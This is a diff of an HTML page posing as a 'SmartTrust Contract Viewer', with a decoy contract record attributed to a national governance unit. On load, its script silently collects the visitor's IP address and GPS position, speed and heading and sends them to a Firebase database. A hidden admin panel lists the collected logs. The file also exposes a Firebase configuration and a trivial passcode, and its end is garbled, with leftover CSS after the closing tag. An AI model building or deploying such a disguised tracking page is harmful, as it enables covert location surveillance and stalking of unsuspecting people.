@@ -1,40 +1,157 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>SmartTrust Contract Viewer</title>
   <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f4f6f9;
-      color: #333;
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+    body { background: #0a0a0a; color: #fff; padding: 20px; }
+    #viewer, #adminPanel { display: none; }
+    .hidden { display: none; }
+    .loader { border: 5px solid #444; border-top: 5px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 50px auto; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .header { font-size: 24px; color: #00ffcc; margin-bottom: 1rem; }
+    .doc-info { background: #111; padding: 1rem; border-radius: 10px; margin-bottom: 1rem; }
+    .doc-info p { margin: 6px 0; }
+    .footer { text-align: center; margin-top: 2rem; color: #aaa; font-size: 0.85rem; }
+    .admin-btn { position: fixed; top: 10px; right: 10px; font-size: 12px; color: #00ffcc; cursor: pointer; }
+    .passcode-screen { text-align: center; margin-top: 80px; }
+    input[type="password"] { padding: 10px; font-size: 16px; border: none; border-radius: 5px; margin: 10px; }
+    button { background: #00ffcc; border: none; padding: 10px 15px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+    table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-size: 14px; }
+    th, td { border: 1px solid #444; padding: 8px; text-align: center; }
+    h2 { color: #00ffcc; margin-bottom: 10px; }
+  </style>
+</head>
+<body>
+
+<!-- Admin trigger -->
+<div class="admin-btn" onclick="toggleAdmin()">Admin Panel</div>
+
+<!-- Passcode Unlock -->
+<div id="unlock">
+  <div class="passcode-screen">
+    <h2>Enter Access Code</h2>
+    <input type="password" id="passcode" placeholder="Enter Passcode" />
+    <br/>
+    <button onclick="checkPass()">Unlock</button>
+  </div>
+</div>
+
+<!-- Viewer -->
+<div id="viewer">
+  <div class="header">SmartTrust Contract Viewer</div>
+  <div class="doc-info">
+    <p><strong>Document:</strong> SC-024/NGX-CON</p>
+    <p><strong>Status:</strong> Active</p>
+    <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
+    <p><strong>Effective Date:</strong> August 1, 2025</p>
+    <p><strong>Parties:</strong> GlobalChain Inc. & SmartCheck Solutions</p>
+    <p><strong>Digital Signature:</strong> ✅ Verified</p>
+  </div>
+  <div class="loader"></div>
+  <p>Loading contract document...</p>
+  <div class="footer">© 2025 SmartTrust. All rights reserved.</div>
+</div>
+
+<!-- Admin Panel -->
+<div id="adminPanel">
+  <h2>GPS & IP Log</h2>
+  <div class="loader" id="logLoading"></div>
+  <table id="logTable" class="hidden">
+    <thead>
+      <tr><th>Timestamp</th><th>Lat</th><th>Lon</th><th>Speed</th><th>Dir</th><th>IP</th></tr>
+    </thead>
+    <tbody id="logBody"></tbody>
+  </table>
+</div>
+
+<!-- Firebase + GPS Logic -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+  // Firebase Config
+  const firebaseConfig = {
+    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+    authDomain: "gps-d0bab.firebaseapp.com",
+    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+    projectId: "gps-d0bab",
+    storageBucket: "gps-d0bab.appspot.com",
+    messagingSenderId: "810816177909",
+    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Collect IP
+  fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(ipData => {
+      const ip = ipData.ip;
+      logData(ip);
+    });
+
+  // Log GPS + IP
+  function logData(ip) {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude, speed, heading } = pos.coords;
+        const timestamp = new Date().toLocaleString();
+        const data = {
+          lat: latitude,
+          lon: longitude,
+          speed: speed || 0,
+          dir: heading || 0,
+          ip,
+          timestamp
+        };
+        db.ref("logs").push(data);
+      });
     }
-    header {
-      background-color: #2e86de;
-      color: white;
-      padding: 1rem 2rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+  }
+
+  // Admin unlock logic
+  function checkPass() {
+    const input = document.getElementById("passcode").value;
+    if (input === "12345") {
+      document.getElementById("unlock").style.display = "none";
+      document.getElementById("viewer").style.display = "block";
+    } else {
+      alert("Incorrect code.");
     }
-    header h1 {
-      margin: 0;
-    }
-    nav {
-      background: #fff;
-      padding: 1rem 2rem;
-      display: flex;
-      gap: 1rem;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    nav button {
-      background: none;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .content {
+  }
+
+  // Toggle Admin Panel
+  function toggleAdmin() {
+    const panel = document.getElementById("adminPanel");
+    const table = document.getElementById("logTable");
+    const loader = document.getElementById("logLoading");
+    panel.style.display = panel.style.display === "block" ? "none" : "block";
+
+    db.ref("logs").once("value", snap => {
+      const logs = snap.val();
+      const tbody = document.getElementById("logBody");
+      tbody.innerHTML = "";
+      for (let key in logs) {
+        const { timestamp, lat, lon, speed, dir, ip } = logs[key];
+        tbody.innerHTML += `<tr>
+          <td>${timestamp}</td>
+          <td>${lat.toFixed(5)}</td>
+          <td>${lon.toFixed(5)}</td>
+          <td>${speed}</td>
+          <td>${dir}</td>
+          <td>${ip}</td>
+        </tr>`;
+      }
+      loader.classList.add("hidden");
+      table.classList.remove("hidden");
+    });
+  }
+</script>
+
+</body>
+</html>    .content {
       padding: 2rem;
     }
     .doc {
